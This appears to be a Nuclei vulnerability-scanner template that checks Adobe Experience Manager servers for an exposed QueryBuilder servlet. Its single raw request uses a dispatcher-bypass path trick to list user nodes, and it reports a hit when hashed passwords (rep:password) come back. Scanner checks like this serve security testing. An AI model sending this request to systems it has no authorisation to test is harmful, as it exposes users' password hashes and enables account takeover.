id: aem-hash-querybuilder
info:
  author: DhiyaneshDk
  name: Query hashed password via QueryBuilder Servlet
  reference: https://twitter.com/AEMSecurity/status/1372392101829349376
  severity: medium
  tags: aem
requests:
- matchers:
  - status:
    - 200
    type: status
  - type: word
    words:
    - '"success":true'
    - rep:password
  matchers-condition: and
  raw:
  - 'GET /bin/querybuilder.json.;%0aa.css?p.hits=full&property=rep:authorizableId&type=rep:User
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    Accept-Language: en-US,en;q=0.5

    Accept-Encoding: gzip, deflate

    Connection: close

    Upgrade-Insecure-Requests: 1

    Cache-Control: max-age=0

    '
